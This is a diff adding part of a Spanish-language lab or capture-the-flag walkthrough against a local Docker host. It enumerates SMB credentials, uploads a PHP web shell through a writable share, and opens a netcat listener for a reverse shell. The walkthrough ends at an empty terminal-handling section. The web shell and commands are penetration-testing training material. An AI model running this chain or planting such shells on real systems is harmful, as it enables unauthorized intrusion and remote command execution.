@@ -46,4 +46,68 @@ Realizamos un fuzzeo en busca de directorios, subdirectorios y subdominios inter
 
 Nos centramos en el servidor smb, lanzamos enum4linux, para una posible enumeración de usuarios 
 
+```bash
+
 enum4linux 172.17.0.2
+------------------------------------------------------------------------------
+SMB         172.17.0.2      445    0D5A72EE76E8     [+] 0D5A72EE76E8\bob:star
+
+```
+Conseguimos las credenciales para bob: bob@star
+```bash
+smbmap -H 172.17.0.2 -u 'bob' -p 'star'
+-----------------------------------------------------------
+
+[+] IP: 172.17.0.2:445  Name: 172.17.0.2                Status: NULL Session
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        print$                                                  READ ONLY       Printer Drivers
+        html                                                    READ, WRITE     HTML Share
+        IPC$                                                    NO ACCESS       IPC Service (0d5a72ee76e8 ser
+
+```
+
+Nos encontramos con que bob tiene permisos para modificar la carpeta html del servidor Apache, vamos a intentar subir un archivo PHP para realizar RCE.
+
+
+Para acceder al recurso en el servidor smb usamos el comando:
+```bash
+smbclient //172.17.0.2/html -U bob 
+Password for [WORKGROUP\bob]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Fri Oct 17 20:46:06 2025
+  ..                                  D        0  Thu Apr 11 04:18:47 2024
+  index.html                          N     1832  Thu Apr 11 04:21:43 2024
+
+                82083148 blocks of size 1024. 60066552 blocks available
+
+```
+crearemos un revershell con php 
+
+```bash
+<?php
+        system($_GET['cmd']);
+?>
+```
+
+<img width="1266" height="711" alt="image" src="https://github.com/user-attachments/assets/1ca8a458-75dd-48ea-8f18-c7f830085537" />
+
+
+Llamamos al archivo y comprobamos que funciona correctamente
+
+nos ponemos en escucha con nc 
+
+```bash
+nc -lnvp <port>
+```
+
+<img width="673" height="159" alt="image" src="https://github.com/user-attachments/assets/1810a5c2-5568-43e7-ba38-44ef7ec55070" />
+
+conseguimos una revershell exitosa aprovecharemos las credenciales de bob y nos haremos su bobo
+
+# tratamiento de tty 
+
+```bash
+
+```
